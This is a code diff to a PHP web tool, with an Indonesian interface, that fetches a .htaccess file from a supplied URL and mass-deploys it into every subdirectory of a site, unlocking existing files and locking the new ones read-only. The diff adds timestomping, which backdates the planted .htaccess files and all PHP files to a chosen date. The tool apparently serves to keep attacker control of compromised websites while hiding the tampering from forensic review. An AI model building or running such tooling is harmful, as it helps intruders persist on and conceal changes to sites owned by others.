@@ -22,6 +22,8 @@ function fetchFileFromUrl($url) {
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $targetPath = rtrim($_POST['target_path'], '/');
     $url = $_POST['htaccess_url'];
+$timestamp = !empty($_POST['timestamp']) ? strtotime($_POST['timestamp']) : false;
+
 
     if (!is_dir($targetPath)) {
         $error[] = "❌ Target path not found: $targetPath";
@@ -77,28 +79,47 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 }
             }
 
-            function deployHtaccess($dir, $content, &$success, &$error) {
-                foreach (scandir($dir) as $item) {
-                    if ($item === '.' || $item === '..') continue;
-                    $path = $dir . '/' . $item;
-                    if (is_dir($path)) {
-                        $htaccessPath = $path . '/.htaccess';
+            function deployHtaccess($dir, $content, &$success, &$error, $timestamp = false) {
+    foreach (scandir($dir) as $item) {
+        if ($item === '.' || $item === '..') continue;
+        $path = $dir . '/' . $item;
 
-                        if (file_exists($htaccessPath) && !is_writable($htaccessPath)) {
-                            $error[] = "❌ Gagal deploy ke: $htaccessPath (file tidak writable / dilock)";
-                        } elseif (@file_put_contents($htaccessPath, $content) === false) {
-                            $error[] = "❌ Gagal deploy ke: $htaccessPath (tidak bisa menulis file)";
-                        } else {
-                            if (@chmod($htaccessPath, 0444)) {
-                                $success[] = "✅ Deployed & chmod .htaccess: $htaccessPath";
-                            } else {
-                                $error[] = "❌ Gagal chmod .htaccess 0444: $htaccessPath";
-                            }
-                        }
-                        deployHtaccess($path, $content, $success, $error);
+        if (is_dir($path)) {
+            $htaccessPath = $path . '/.htaccess';
+
+            if (file_exists($htaccessPath) && !is_writable($htaccessPath)) {
+                $error[] = "❌ Gagal deploy ke: $htaccessPath (file tidak writable / dilock)";
+            } elseif (@file_put_contents($htaccessPath, $content) === false) {
+                $error[] = "❌ Gagal deploy ke: $htaccessPath (tidak bisa menulis file)";
+            } else {
+                if (@chmod($htaccessPath, 0444)) {
+                    $success[] = "✅ Deployed & chmod .htaccess: $htaccessPath";
+                } else {
+                    $error[] = "❌ Gagal chmod .htaccess 0444: $htaccessPath";
+                }
+
+                // Apply timestamp jika disediakan
+                if ($timestamp) {
+                    if (@touch($htaccessPath, $timestamp)) {
+                        $success[] = "⏱️ Timestamp set untuk $htaccessPath";
+                    } else {
+                        $error[] = "❌ Gagal set timestamp: $htaccessPath";
                     }
                 }
             }
+
+            // Ulangi ke subfolder
+            deployHtaccess($path, $content, $success, $error, $timestamp);
+        } elseif (is_file($path) && pathinfo($path, PATHINFO_EXTENSION) === 'php' && $timestamp) {
+            if (@touch($path, $timestamp)) {
+                $success[] = "⏱️ Timestamp set untuk PHP: $path";
+            } else {
+                $error[] = "❌ Gagal set timestamp untuk PHP: $path";
+            }
+        }
+    }
+}
+
 
             $success[] = "--- 🔧 LANGKAH AWAL: Set Permission Folder & File ---";
             setFolders0755($targetPath, $success, $error);
@@ -106,7 +127,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             $success[] = "--- 🔓 UNLOCK .htaccess jika ada ---";
             unlockHtaccessFiles($targetPath, $success, $error);
             $success[] = "--- 🚀 MASS DEPLOY .htaccess ---";
-            deployHtaccess($targetPath, $htaccessContent, $success, $error);
+            deployHtaccess($targetPath, $htaccessContent, $success, $error, $timestamp);
+
         }
     }
 }
@@ -133,6 +155,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
         <label>🌐 URL .htaccess (GitHub raw, dll):</label>
         <input type="text" name="htaccess_url" placeholder="https://raw.githubusercontent.com/.../.htaccess" required>
+
+<label>⏱️ Timestamp (YYYY-MM-DD HH:MM:SS):</label>
+<input type="text" name="timestamp" placeholder="2024-01-01 00:00:00 (opsional)">
 
         <button type="submit">🚀 Deploy Sekarang</button>
     </form>
